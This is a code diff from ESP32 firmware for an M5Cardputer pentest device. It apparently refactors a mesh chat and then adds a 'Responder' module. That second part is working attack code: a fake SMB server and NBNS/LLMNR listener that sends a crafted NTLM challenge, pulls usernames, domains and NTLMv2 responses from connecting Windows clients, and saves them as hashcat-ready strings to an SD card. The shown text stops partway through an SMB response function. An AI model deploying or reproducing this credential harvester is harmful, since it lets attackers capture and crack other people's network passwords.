-        char hashOut[9], temp[MAX_MSG_LEN + 16];
-        snprintf(temp, sizeof(temp), "%s%lu", action, millis());
-        simpleHash(temp, hashOut);
-
-        strncpy(msg.id, hashOut, 8); msg.id[8] = '\0';
-        strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
-        strncpy(msg.body, action, MAX_MSG_LEN - 1); msg.body[MAX_MSG_LEN - 1] = '\0';
-
-        // Envoi avec CRC
-        uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
-        memcpy(packet, &msg, sizeof(MeshMessage));
-        uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
-        memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
-        esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
-
-        rememberId(msg.id);
-        addMessage(action);
-        drawChatWindow();
-     } else if (strcmp(input, "/people") == 0) {
-        char buf[MAX_MSG_LEN];
-        addMessage("-> Users online:");
-        for (int i = 0; i < nodesCount; i++) {
-            snprintf(buf, sizeof(buf), " %s", nodesConnected[i].nick);
-            addMessage(buf);
-        }
-        drawChatWindow();
-     } else if (strcmp(input, "/help") == 0) {
-        addMessage("/nick <name> : change pseudo");
-        addMessage("/me <action> : action roleplay");
-        addMessage("/clear : efface le chat");
-        addMessage("/help : commandes");
-        addMessage("/people : online people");
-        drawChatWindow();
-    } else {
-        addMessage("Unknown command. /help");
-        drawChatWindow();
-    }
-}
-
-// ----- Réception -----
-void OnDataRecvChat(const uint8_t *mac, const uint8_t *incomingData, int len) {
+/* ---------- Traitement d’un paquet en attente ---------- */
+void handleIncomingPacket(const uint8_t* data, int len) {
     if (len != sizeof(MeshMessage) + sizeof(uint16_t)) return;
 
-    uint16_t receivedCrc;
-    memcpy(&receivedCrc, incomingData + sizeof(MeshMessage), sizeof(uint16_t));
-    uint16_t computedCrc = crc16(incomingData, sizeof(MeshMessage));
-    if (receivedCrc != computedCrc) return;
+    uint16_t rxCrc;
+    memcpy(&rxCrc, data + sizeof(MeshMessage), sizeof(uint16_t));
+    if (rxCrc != crc16(data, sizeof(MeshMessage))) return;
 
     MeshMessage msg;
-    memcpy(&msg, incomingData, sizeof(MeshMessage));
+    memcpy(&msg, data, sizeof(MeshMessage));
 
     if (hasSeenId(msg.id)) return;
     rememberId(msg.id);
 
-    // ----- SI C'EST UN PING, ON MET A JOUR LA PRÉSENCE -----
+    // --- Gestion du PING (mise à jour de présence) ---
     if (strcmp(msg.body, "PING") == 0) {
         updatePresence(msg.from);
+        esp_now_send(broadcastAddressEspNow, data, len);
+        return;                               // pas d’affichage
+    }
+    // --- Filtre messages "System" visant ce client ---
+    if (!strcmp(msg.from, "System") && strstr(msg.body, currentNick))
+        return;
 
-        // On peut rebroadcaster si on veut le mode "mesh"
-        esp_now_send(broadcastAddressEspNow, incomingData, len);
-        // IMPORTANT: NE PAS L'AJOUTER AU CHAT, car c'est juste un ping
-        return;
-    }
-    // Ignorer les messages "System" nous concernant
-    if (strcmp(msg.from, "System") == 0 && strstr(msg.body, currentNick)) {
-        return;
-    }
-    // Sinon c'est un message "classique"
-    char display[MAX_MSG_LEN + 16];
-    snprintf(display, sizeof(display), "%s: %s", msg.from, msg.body);
-    addMessage(display);
+    char line[MAX_MSG_LEN + 16];
+    snprintf(line, sizeof(line), "%s: %s", msg.from, msg.body);
+    addMessage(line);
     drawChatWindow();
 
-    // Re-broadcast si vous le désirez en mode "mesh"
-    esp_now_send(broadcastAddressEspNow, incomingData, len);
+    esp_now_send(broadcastAddressEspNow, data, len);
 }
 
-void broadcastChatMessage(const char* from, const char* body) {
-    // Construction du message
-    MeshMessage msg;
-    char hashOut[9], temp[MAX_MSG_LEN + 32];
+/* ----- Commandes ----- */
+void handleCommand(const char* in) {
+    if (!strncmp(in, "/nick ", 6)) {
+        strncpy(currentNick, in + 6, 15); currentNick[15] = '\0';
+        char l[MAX_MSG_LEN]; snprintf(l, sizeof(l),
+                         "Nickname set to: %s", currentNick);
+        addMessage(l); drawChatWindow();
 
-    // On calcule un hash sur from + body + l'heure courante (millis())
-    // afin de générer un id unique.
-    snprintf(temp, sizeof(temp), "%s%s%lu", from, body, millis());
-    simpleHash(temp, hashOut);
+    } else if (!strcmp(in, "/clear")) {
+        messageCount = messageHead = 0; drawChatWindow();
 
-    strncpy(msg.id, hashOut, 8);
-    msg.id[8] = '\0';
+    } else if (!strncmp(in, "/me ", 4)) {
+        char act[MAX_MSG_LEN];
+        snprintf(act, sizeof(act), "* %s %s", currentNick, in + 4);
+        broadcastChatMessage(currentNick, act);
 
-    strncpy(msg.from, from, 15);
-    msg.from[15] = '\0';
-
-    strncpy(msg.body, body, MAX_MSG_LEN - 1);
-    msg.body[MAX_MSG_LEN - 1] = '\0';
-
-    // Prépare le buffer à envoyer : message + CRC16
-    uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
-    memcpy(packet, &msg, sizeof(MeshMessage));
-    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
-    memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
-
-    // Envoie en broadcast
-    esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
-
-    // Évite de re-traiter nous-même ce message si on le reçoit en rebond
-    rememberId(msg.id);
-
-    if (!(strcmp(from, "System") == 0 && strstr(body, currentNick))) {
-        char outLine[MAX_MSG_LEN + 32];
-        snprintf(outLine, sizeof(outLine), "%s: %s", from, body);
-        addMessage(outLine);
+    } else if (!strcmp(in, "/people")) {
+        addMessage("-> Users online:");
+        char b[MAX_MSG_LEN];
+        for (int i = 0; i < nodesCount; ++i) {
+            snprintf(b, sizeof(b), " %s", nodesConnected[i].nick);
+            addMessage(b);
+        }
         drawChatWindow();
+
+    } else if (!strcmp(in, "/help")) {
+        addMessage("/nick <name> : change pseudo");
+        addMessage("/me <action> : action roleplay");
+        addMessage("/clear       : clear the chat");
+        addMessage("/people      : list connected");
+        drawChatWindow();
+
+    } else {
+        addMessage("Unknown command. /help"); drawChatWindow();
     }
 }
 
+/* ----- Envoi d’un message Chat (hors callback) ----- */
+void broadcastChatMessage(const char* from, const char* body) {
+    MeshMessage msg;
+    char hash[9], tmp[MAX_MSG_LEN+32];
+    snprintf(tmp, sizeof(tmp), "%s%s%lu", from, body, millis());
+    simpleHash(tmp, hash);
+
+    strncpy(msg.id,   hash, 8); msg.id[8] = '\0';
+    strncpy(msg.from, from, 15); msg.from[15] = '\0';
+    strncpy(msg.body, body, MAX_MSG_LEN-1); msg.body[MAX_MSG_LEN-1]='\0';
+
+    uint8_t pkt[sizeof(MeshMessage)+2];
+    memcpy(pkt, &msg, sizeof(MeshMessage));
+    uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
+    memcpy(pkt + sizeof(MeshMessage), &crc, 2);
+
+    esp_now_send(broadcastAddressEspNow, pkt, sizeof(pkt));
+    rememberId(msg.id);
+
+    char line[MAX_MSG_LEN+32];
+    snprintf(line, sizeof(line), "%s: %s", from, body);
+    addMessage(line); drawChatWindow();
+}
+
+/* ----- Ping périodique ----- */
 void broadcastPing() {
     MeshMessage msg;
-    char hashOut[9], temp[MAX_MSG_LEN + 16];
-    snprintf(temp, sizeof(temp), "%sPING%lu", currentNick, millis());
-    simpleHash(temp, hashOut);
+    char hash[9], tmp[32];
 
-    strncpy(msg.id, hashOut, 8); 
-    msg.id[8] = '\0';
+    // hash = from + "PING" + horodatage
+    snprintf(tmp, sizeof(tmp), "%sPING%lu", currentNick, millis());
+    simpleHash(tmp, hash);
 
-    strncpy(msg.from, currentNick, 15);
-    msg.from[15] = '\0';
-
-    // On indique clairement "PING" dans le body
+    strncpy(msg.id,   hash, 8);  msg.id[8]   = '\0';
+    strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
     strncpy(msg.body, "PING", MAX_MSG_LEN - 1);
     msg.body[MAX_MSG_LEN - 1] = '\0';
 
-    // On calcule le CRC, comme d’habitude
-    uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
-    memcpy(packet, &msg, sizeof(MeshMessage));
+    uint8_t pkt[sizeof(MeshMessage) + 2];
+    memcpy(pkt, &msg, sizeof(MeshMessage));
     uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
-    memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
+    memcpy(pkt + sizeof(MeshMessage), &crc, 2);
 
-    esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
-    // Se souvenir de ce hash, pour éviter la rediffusion en boucle
-    rememberId(msg.id);
+    esp_now_send(broadcastAddressEspNow, pkt, sizeof(pkt));
+    rememberId(msg.id);           // pour ignorer notre propre écho
 }
 
+
+/* ----- Gestion de présence ----- */
 void updatePresence(const char* nick) {
-    for (int i = 0; i < nodesCount; i++) {
-        if (strcmp(nodesConnected[i].nick, nick) == 0) {
-            nodesConnected[i].lastSeen = millis();
-            return;
+    for (int i = 0; i < nodesCount; ++i)
+        if (!strcmp(nodesConnected[i].nick, nick)) {
+            nodesConnected[i].lastSeen = millis(); return;
         }
-    }
 
     if (nodesCount < MAX_NODES) {
         strncpy(nodesConnected[nodesCount].nick, nick, 15);
         nodesConnected[nodesCount].nick[15] = '\0';
         nodesConnected[nodesCount].lastSeen = millis();
-        nodesCount++;
+        ++nodesCount;
     }
 }
-
-
 void checkPresenceTimeouts() {
     unsigned long now = millis();
-    for (int i = 0; i < nodesCount; i++) {
+    for (int i = 0; i < nodesCount; ++i)
         if ((now - nodesConnected[i].lastSeen) > TIMEOUT_PRESENCE) {
-            // Annonce du départ
-            char msgLeave[MAX_MSG_LEN];
-            snprintf(msgLeave, sizeof(msgLeave), "%s left the chat !", nodesConnected[i].nick);
-            broadcastChatMessage("System", msgLeave);
+            char m[MAX_MSG_LEN];
+            snprintf(m, sizeof(m), "%s left the chat!", nodesConnected[i].nick);
+            broadcastChatMessage("System", m);
 
-            // Décalage pour supprimer
-            for (int j = i; j < nodesCount - 1; j++) {
-                nodesConnected[j] = nodesConnected[j + 1];
-            }
-            nodesCount--;
-            i--; // Réajuster l’index
+            for (int j = i; j < nodesCount-1; ++j)
+                nodesConnected[j] = nodesConnected[j+1];
+            --nodesCount; --i;
         }
-    }
 }
 
-
-// ----- Clavier -----
+// ----- Gestion clavier & saisie utilisateur -----
 void handleKeyboard() {
-    if (M5Cardputer.Keyboard.isPressed()) {
-        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
+    if (!M5Cardputer.Keyboard.isPressed()) return;
 
-        for (auto c : status.word) {
-            int len = strlen(inputBuffer);
-            if (len < MAX_MSG_LEN - 2) {
-                inputBuffer[len] = c;
-                inputBuffer[len + 1] = '\0';
-            }
+    Keyboard_Class::KeysState st = M5Cardputer.Keyboard.keysState();
+
+    /* Ajout des caractères tapés */
+    for (char c : st.word) {
+        int n = strlen(inputBuffer);
+        if (n < MAX_MSG_LEN - 2) {              // -2 : place pour '\0'
+            inputBuffer[n]   = c;
+            inputBuffer[n+1] = '\0';
         }
-
-        if (status.del && strlen(inputBuffer) > 0) {
-            inputBuffer[strlen(inputBuffer) - 1] = '\0';
-        }
-
-        if (status.enter && strlen(inputBuffer) > 0) {
-                if (inputBuffer[0] == '/') {
-                handleCommand(inputBuffer);
-            } else {
-                MeshMessage msg;
-                char hashOut[9], temp[MAX_MSG_LEN + 16];
-                snprintf(temp, sizeof(temp), "%s%s%lu", currentNick, inputBuffer, millis());
-                simpleHash(temp, hashOut);
-
-                strncpy(msg.id, hashOut, 8); msg.id[8] = '\0';
-                strncpy(msg.from, currentNick, 15); msg.from[15] = '\0';
-                strncpy(msg.body, inputBuffer, MAX_MSG_LEN - 1); msg.body[MAX_MSG_LEN - 1] = '\0';
-
-                uint8_t packet[sizeof(MeshMessage) + sizeof(uint16_t)];
-                memcpy(packet, &msg, sizeof(MeshMessage));
-                uint16_t crc = crc16((uint8_t*)&msg, sizeof(MeshMessage));
-                memcpy(packet + sizeof(MeshMessage), &crc, sizeof(uint16_t));
-                esp_now_send(broadcastAddressEspNow, packet, sizeof(packet));
-
-                rememberId(msg.id);
-                char out[MAX_MSG_LEN];
-                snprintf(out, MAX_MSG_LEN, "YOU: %s", inputBuffer);
-                addMessage(out);
-                drawChatWindow();
-            }
-
-            inputBuffer[0] = '\0';
-        }
-
-        M5.Display.fillRect(0, 120, 240, 16, TFT_NAVY);
-        M5.Display.setCursor(0, 120);
-        M5.Display.setTextColor(TFT_YELLOW);
-        M5.Display.print("> ");
-        M5.Display.print(inputBuffer);
-        
-
     }
+    /* Backspace */
+    if (st.del && *inputBuffer)
+        inputBuffer[strlen(inputBuffer) - 1] = '\0';
+
+    /* Entrée : envoi */
+    if (st.enter && *inputBuffer) {
+        if (inputBuffer[0] == '/')
+            handleCommand(inputBuffer);
+        else
+            broadcastChatMessage(currentNick, inputBuffer);
+
+        inputBuffer[0] = '\0';
+    }
+
+    /* Ligne d’édition */
+    M5.Display.fillRect(0, 120, 240, 16, TFT_NAVY);
+    M5.Display.setCursor(0, 120);
+    M5.Display.setTextColor(TFT_YELLOW);
+    M5.Display.print("> ");
+    M5.Display.print(inputBuffer);
 }
 
 // ----- Fonction principale -----
 void EvilChatMesh() {
+    M5.begin();
     M5.Display.setTextSize(1);
     M5.Display.setTextColor(TFT_WHITE);
     M5.Display.fillScreen(TFT_BLACK);
-    M5.Display.setCursor(0, 0);
-    
-    WiFi.disconnect(true);
-    delay(100);
+
+    WiFi.disconnect(true); delay(100);
     WiFi.mode(WIFI_STA);
 
     if (esp_now_init() != ESP_OK) {
-        M5.Display.println("ESP-NOW init failed");
-        return;
+        M5.Display.println("ESP‑NOW init failed"); return;
     }
-
     esp_now_register_recv_cb(OnDataRecvChat);
 
     esp_now_peer_info_t peer = {};
     memcpy(peer.peer_addr, broadcastAddressEspNow, 6);
-    peer.channel = 0;
-    peer.encrypt = false;
-    if (!esp_now_is_peer_exist(peer.peer_addr)) {
+    peer.channel = 0; peer.encrypt = false;
+    if (!esp_now_is_peer_exist(peer.peer_addr))
         esp_now_add_peer(&peer);
-    }
 
     drawChatWindow();
-    inputBuffer[0] = '\0';
-    
-    char msgArrive[MAX_MSG_LEN];
-    snprintf(msgArrive, sizeof(msgArrive), "%s enter the chat!", currentNick);
-    broadcastChatMessage("System", msgArrive);
-    
-    while (true) {
-        M5.update();
-        M5Cardputer.update();
 
+    char msgArr[MAX_MSG_LEN];
+    snprintf(msgArr, sizeof(msgArr), "%s enter the chat!", currentNick);
+    broadcastChatMessage("System", msgArr);
+
+    /* ---------- Boucle ---------- */
+    while (true) {
+        M5.update(); M5Cardputer.update();
+
+        /* 1. paquet reçu ? */
+        if (newPacketPending) {
+            noInterrupts();
+            uint8_t localBuf[sizeof(MeshMessage)+2];
+            int     len = packetLen;
+            memcpy(localBuf, (const void*)packetBuffer, len);
+            newPacketPending = false;
+            interrupts();
+
+            handleIncomingPacket(localBuf, len);
+        }
+
+        /* 2. ping & timeouts */
         unsigned long now = millis();
         if (now - lastPing > PING_INTERVAL) {
-            lastPing = now;
-            broadcastPing();
+            lastPing = now; broadcastPing();
         }
         checkPresenceTimeouts();
-        if (M5Cardputer.Keyboard.isKeyPressed('`')) {
-          char msgDepart[MAX_MSG_LEN];
-          snprintf(msgDepart, sizeof(msgDepart), "%s left the chat!", currentNick);
-          broadcastChatMessage("System", msgDepart);
 
-          esp_now_unregister_recv_cb();
-          esp_now_deinit();
-
-          waitAndReturnToMenu("Left The Chat...");
-          return;
-        }
-        if (M5Cardputer.Keyboard.isChange()) {
+        /* 3. clavier */
+        if (M5Cardputer.Keyboard.isChange())
             handleKeyboard();
+
+        /* 4. touche ` pour quitter */
+        if (M5Cardputer.Keyboard.isKeyPressed('`')) {
+            char m[MAX_MSG_LEN];
+            snprintf(m, sizeof(m), "%s left the chat!", currentNick);
+            broadcastChatMessage("System", m);
+
+            esp_now_unregister_recv_cb();
+            esp_now_deinit();
+            waitAndReturnToMenu("Left the chat...");
+            return;
         }
         delay(10);
     }
+}
+
+
+/*
+==============================================================
+Responder
+==============================================================
+*/
+
+int hashCount = 0;
+String lastUser = "";
+String lastDomain = "";
+String lastQueryName     = "";  // nom interrogé (NBNS/LLMNR)
+String lastQueryProtocol = "";  // "NBNS" ou "LLMNR"
+String lastClient        = "";  //hostname SMB
+
+// Ports pour NBNS et LLMNR
+const uint16_t NBNS_PORT = 137;
+const uint16_t LLMNR_PORT = 5355;
+
+// Objet UDP pour NBNS et LLMNR
+WiFiUDP nbnsUDP;
+WiFiUDP llmnrUDP;
+
+// Serveur TCP SMB (port 445)
+WiFiServer smbServer(445);
+
+// Structure pour stocker un client SMB en cours et ses infos
+struct SMBClientState {
+  WiFiClient client;
+  bool active;
+  uint64_t sessionId;
+  uint8_t challenge[8];
+} smbState;
+
+/* =================  CONST & FLAGS SMB  ================= */
+#define SMB_FLAGS_REPLY               0x80
+#define SMB_FLAGS2_UNICODE            0x8000
+#define SMB_FLAGS2_ERR_STATUS32       0x4000
+#define SMB_FLAGS2_EXTSEC             0x0800
+#define SMB_FLAGS2_SIGNING_ENABLED    0x0008
+
+#define SMB_CAP_EXTSEC      0x80000000UL
+#define SMB_CAP_LARGE_FILES 0x00000008UL
+#define SMB_CAP_NT_SMBS     0x00000010UL
+#define SMB_CAP_UNICODE     0x00000004UL
+#define SMB_CAP_STATUS32    0x00000040UL
+
+const uint32_t SMB_CAPABILITIES =
+  SMB_CAP_EXTSEC | SMB_CAP_LARGE_FILES | SMB_CAP_NT_SMBS |
+  SMB_CAP_UNICODE | SMB_CAP_STATUS32;      // ≈ 0x8000005C
+/* ====================================================== */
+
+
+void encodeNetBIOSName(const char* name, uint8_t out[32]) {
+  // Préparer le nom sur 15 caractères (pad avec espaces) + type (0x20)
+  char namePad[16];
+  memset(namePad, ' ', 15);
+  namePad[15] = 0x20; // suffixe type 0x20 (Server service)
+  // Copier le nom en majuscules dans namePad
+  size_t n = strlen(name);
+  if (n > 15) n = 15;
+  for (size_t i = 0; i < n; ++i) {
+    namePad[i] = toupper(name[i]);
+  }
+  // Encoder chaque octet en deux caractères 'A' à 'P'
+  for (int i = 0; i < 16; ++i) {
+    uint8_t c = (uint8_t)namePad[i];
+    uint8_t highNibble = (c >> 4) & 0x0F;
+    uint8_t lowNibble = c & 0x0F;
+    out[2 * i]     = 0x41 + highNibble;
+    out[2 * i + 1] = 0x41 + lowNibble;
+  }
+}
+
+IPAddress getIPAddress() {
+    // 1) Station mode
+    if (WiFi.status() == WL_CONNECTED) {
+        IPAddress ip = WiFi.localIP();
+        if (ip && ip != IPAddress(0,0,0,0)) {
+            return ip;
+        }
+    }
+    // 2) SoftAP mode
+    if (WiFi.getMode() & WIFI_MODE_AP) {
+        IPAddress ip = WiFi.softAPIP();
+        if (ip && ip != IPAddress(0,0,0,0)) {
+            return ip;
+        }
+    }
+    return IPAddress(0,0,0,0);
+}
+
+uint64_t getWindowsTimestamp() {
+  const uint64_t EPOCH_DIFF = 11644473600ULL;
+  struct timeval tv;
+  gettimeofday(&tv, NULL);
+  return ((tv.tv_sec + EPOCH_DIFF) * 10000000ULL + (tv.tv_usec * 10ULL));
+}
+
+// Buffer pour le NTLM Type 2 généré dynamiquement
+uint8_t ntlmType2Buffer[512];
+uint16_t ntlmType2Len = 0;
+
+
+void buildNTLMType2Msg(uint8_t *challenge, uint8_t *buffer, uint16_t *len) {
+  const char* netbiosName = "EVIL-M5Project";
+  const char* netbiosDomain = "EVILGROUP";
+  const char* dnsDomain = "EVIL.LOCAL";
+
+  uint8_t avPairs[512];
+  int offset = 0;
+
+  auto appendAVPair = [&](uint16_t type, const char* data) {
+    int l = strlen(data);
+    avPairs[offset++] = type & 0xFF;
+    avPairs[offset++] = (type >> 8) & 0xFF;
+    avPairs[offset++] = (l * 2) & 0xFF;
+    avPairs[offset++] = ((l * 2) >> 8) & 0xFF;
+    for (int i = 0; i < l; i++) {
+      avPairs[offset++] = data[i];
+      avPairs[offset++] = 0x00;
+    }
+  };
+
+  appendAVPair(0x0001, netbiosName);
+  appendAVPair(0x0002, netbiosDomain);
+  appendAVPair(0x0003, netbiosName);
+  appendAVPair(0x0004, dnsDomain);
+  appendAVPair(0x0005, dnsDomain);
+
+  // Timestamp AV Pair
+  avPairs[offset++] = 0x07; avPairs[offset++] = 0x00;
+  avPairs[offset++] = 0x08; avPairs[offset++] = 0x00;
+  uint64_t ts = getWindowsTimestamp();
+  memcpy(avPairs + offset, &ts, 8);
+  offset += 8;
+
+  // End AV Pair
+  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;
+  avPairs[offset++] = 0x00; avPairs[offset++] = 0x00;
+
+  // Préparer NTLM Type 2 message
+  const int NTLM_HEADER_SIZE = 48;
+  memcpy(buffer, "NTLMSSP\0", 8); // Signature
+  buffer[8] = 0x02; buffer[9] = 0x00; buffer[10] = buffer[11] = 0x00; // Type 2
+
+  // Target Name
+  uint16_t targetLen = strlen(netbiosName) * 2;
+  buffer[12] = targetLen & 0xFF; buffer[13] = (targetLen >> 8) & 0xFF;
+  buffer[14] = buffer[12]; buffer[15] = buffer[13];
+  *(uint32_t*)(buffer + 16) = NTLM_HEADER_SIZE;
+
+  // Flags standards recommandés pour NTLMv2
+  *(uint32_t*)(buffer + 20) = 0xE2898215;
+
+  // Challenge de 8 octets
+  memcpy(buffer + 24, challenge, 8);
+  memset(buffer + 32, 0, 8); // Reserved
+
+  // AV Pair offset & length
+  uint16_t avLen = offset;
+  *(uint16_t*)(buffer + 40) = avLen;
+  *(uint16_t*)(buffer + 42) = avLen;
+  *(uint32_t*)(buffer + 44) = NTLM_HEADER_SIZE + targetLen;
+
+  // Copie TargetName en UTF16LE
+  for (int i = 0; i < strlen(netbiosName); i++) {
+    buffer[NTLM_HEADER_SIZE + 2 * i] = netbiosName[i];
+    buffer[NTLM_HEADER_SIZE + 2 * i + 1] = 0x00;
+  }
+
+  // Copie AV Pairs après TargetName
+  memcpy(buffer + NTLM_HEADER_SIZE + targetLen, avPairs, avLen);
+
+  *len = NTLM_HEADER_SIZE + targetLen + avLen;
+}
+
+String readUTF16(uint8_t* pkt, uint32_t offset, uint16_t len) {
+  String res = "";
+  for (uint16_t i = 0; i < len; i += 2) {
+    res += (char)pkt[offset + i];
+  }
+  return res;
+}
+
+void extractAndPrintHash(uint8_t* pkt, uint32_t smbLength, uint8_t* ntlm) {
+  // 1. Little-endian helpers
+  auto le16 = [](uint8_t* p) -> uint16_t {
+    return p[0] | (p[1] << 8);
+  };
+  auto le32 = [](uint8_t* p) -> uint32_t {
+    return p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24);
+  };
+
+  uint32_t base = ntlm - pkt;  // offset of NTLMSSP in packet
+
+  // 2. Offsets and lengths in NTLM AUTH message
+  uint16_t ntRespLen   = le16(ntlm + 20);
+  uint32_t ntRespOff   = le32(ntlm + 24);
+  uint16_t domLen      = le16(ntlm + 28);
+  uint32_t domOffset   = le32(ntlm + 32);
+  uint16_t userLen     = le16(ntlm + 36);
+  uint32_t userOffset  = le32(ntlm + 40);
+  uint16_t wsLen       = le16(ntlm + 44);
+  uint32_t wsOffset    = le32(ntlm + 48);
+
+  // 3. Read UTF-16LE → ASCII
+  auto readUTF16 = [&](uint32_t offset, uint16_t len) -> String {
+    String s = "";
+    if (base + offset + len > smbLength) return s;  // safety
+    for (uint16_t i = 0; i < len; i += 2)
+      s += (char)pkt[base + offset + i];
+    return s;
+  };
+
+  String domain      = readUTF16(domOffset,  domLen);
+  String username    = readUTF16(userOffset, userLen);
+  String workstation = readUTF16(wsOffset, wsLen);
+
+  // 4. Server challenge (8 bytes)
+  char challHex[17];
+  for (int i = 0; i < 8; ++i)
+    sprintf(challHex + 2*i, "%02X", smbState.challenge[i]);
+  challHex[16] = '\0';
+
+  // 5. Full NTLMv2 response en hex
+  String ntRespHex;
+  for (uint16_t i = 0; i < ntRespLen; ++i) {
+    char h[3];
+    sprintf(h, "%02X", pkt[base + ntRespOff + i]);
+    ntRespHex += h;
+  }
+
+  // 6. Split proof & blob
+  String ntProof = ntRespHex.substring(0, 32);
+  String blob    = ntRespHex.substring(32);
+
+  // 7. Format hashcat string
+  String finalHash = "------------------------------------\n Client : " + lastClient + " \n" + username + "::" + domain + ":" + String(challHex) + ":" + ntProof + ":" + blob;
+
+  Serial.println("------- Captured NTLMv2 Hash -------");
+  Serial.println(finalHash);
+  Serial.println("------------------------------------");
+
+  // 8. Save sur SD
+  File file = SD.open("/ntlm_hashes.txt", FILE_APPEND);
+  if (file) {
+    file.println(finalHash);
+    file.close();
+    Serial.println("→ Hash saved to /ntlm_hashes.txt");
+  } else {
+    Serial.println("Error: unable to write to SD card!");
+  }
+
+  // 9. Mettre à jour UI
+  hashCount++;
+  lastUser          = username;
+  lastDomain        = domain;
+  lastClient        = workstation;
+  updateHashUI();
+}
+
+
+void terminateSMB1() {
+  smbState.client.stop();
+  smbState.active = false;
+  Serial.println("Session SMB1 stopped.");
+}
+
+// Token ASN.1 SPNEGO  –  annonce « NTLMSSP » uniquement
+const uint8_t spnegoInitToken[] = {
+  0x60, 0x3A,
+  0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02,   //  OID 1.3.6.1.5.5.2
+  0xA0, 0x30,                                         //  [0] NegTokenInit
+  0x30, 0x2E,                                     //    mechTypes
+  0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A, // NTLM OID
+  0xA2, 0x20,                                     //    reqFlags   (optionnel)
+  0x30, 0x1E,
+  0x02, 0x01, 0x02,                       //      mutual‑auth
+  0x02, 0x01, 0x00                        //      delegation = 0
+};
+
+void sendSMB1NegotiateResponse(uint8_t* req) {
+  uint8_t resp[256] = {0};
+
+  /* ─── NBSS ─── */
+  resp[0] = 0x00;               // Session message – length rempli plus bas
+
+  /* ─── HEADER SMB (32 octets) ─── */
+  memcpy(resp + 4, req, 32);
+  resp[4 + 4]  = 0x72;          // Command = NEGOTIATE
+  resp[4 + 9]  = SMB_FLAGS_REPLY;
+
+  *(uint16_t*)(resp + 4 + 10) =
+    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
+    SMB_FLAGS2_EXTSEC | SMB_FLAGS2_SIGNING_ENABLED;
+
+  *(uint32_t*)(resp + 4 + 5) = 0x00000000;        // STATUS_SUCCESS
+
+  /* ─── PARAMS ─── */
+  const uint8_t WC = 17;
+  resp[4 + 32] = WC;            // WordCount
+
+  uint8_t* p = resp + 4 + 33;   // début des 34 octets
+
+  *(uint16_t*)(p +  0) = 0x0000;           // Dialect index (NT LM 0.12)
+  *(uint8_t *)(p +  2) = 0x03;             // SecurityMode : user‑level + signing supported
+  *(uint16_t*)(p +  3) = 0x0100;           // MaxMpxCount
+  *(uint16_t*)(p +  5) = 1;                // MaxVCs
+  *(uint32_t*)(p +  7) = 0x00010000;       // MaxBufferSize
+  *(uint32_t*)(p + 11) = 0x00010000;       // MaxRawSize
+  *(uint32_t*)(p + 15) = 0;                // SessionKey
+  *(uint32_t*)(p + 19) = SMB_CAPABILITIES; // Capabilities
+  *(uint64_t*)(p + 23) = 0;                // SystemTime (optionnel)
+  *(uint16_t*)(p + 31) = 0;                // TimeZone
+  *(p + 33) = 0;                           // ChallengeLength = 0 (mode ExtSec)
+
+  /* ─── DATA (BCC) : SPNEGO Init ─── */
+  uint16_t bcc = sizeof(spnegoInitToken);
+  *(uint16_t*)(resp + 4 + 33 + WC * 2) = bcc;
+  memcpy(resp + 4 + 33 + WC * 2 + 2, spnegoInitToken, bcc);
+
+  /* ─── Longueur NBSS ─── */
+  uint32_t total = 4 + 33 + WC * 2 + 2 + bcc;
+  resp[1] = (total - 4) >> 16;
+  resp[2] = (total - 4) >> 8;
+  resp[3] = (total - 4);
+
+  smbState.client.write(resp, total);
+  Serial.println("→ Negotiate Response SMB1 envoyé (ExtSec OK)");
+}
+
+void sendSMB1Type2(uint8_t* req, uint8_t* ntlm1) {
+  // 1) Génère un challenge aléatoire de 8 octets
+  for (int i = 0; i < 8; ++i) {
+    smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
+  }
+
+  // 2) Construit dynamiquement le blob NTLMv2 Type 2
+  buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);
+
+  // 3) Prépare la réponse SessionSetupAndX SMB1
+  uint8_t resp[512] = {0};
+
+  // – NBSS + header SMBv1 (copie 32 octets)
+  memcpy(resp + 4, req, 32);
+  resp[4 + 4] = 0x73;  // SMB_COM_SESSION_SETUP_ANDX
+  resp[4 + 9] = SMB_FLAGS_REPLY;
+  *(uint16_t*)(resp + 4 + 10) =
+    SMB_FLAGS2_UNICODE | SMB_FLAGS2_ERR_STATUS32 |
+    SMB_FLAGS2_EXTSEC  | SMB_FLAGS2_SIGNING_ENABLED;
+  *(uint32_t*)(resp + 4 + 5) = 0xC0000016; // STATUS_MORE_PROCESSING_REQUIRED
+
+  // – WordCount et AndX
+  resp[4 + 32] = 4;    // WordCount
+  resp[4 + 33] = 0;    // no further AndX
+  resp[4 + 34] = resp[4 + 35] = 0;
+
+  // – SecurityBlobLength et ByteCount = longueur du blob dynamique
+  *(uint16_t*)(resp + 4 + 38) = ntlmType2Len; // SecurityBlobLength
+  *(uint16_t*)(resp + 4 + 40) = ntlmType2Len; // ByteCount
+
+  // – Copier le blob NTLMv2 Type2 juste après le header
+  memcpy(resp + 4 + 42, ntlmType2Buffer, ntlmType2Len);
+
+  // – Calcul de la longueur NBSS
+  uint32_t total = 4 + 42 + ntlmType2Len;
+  resp[0] = 0x00;
+  resp[1] = (total - 4) >> 16;
+  resp[2] = (total - 4) >> 8;
+  resp[3] = (total - 4);
+
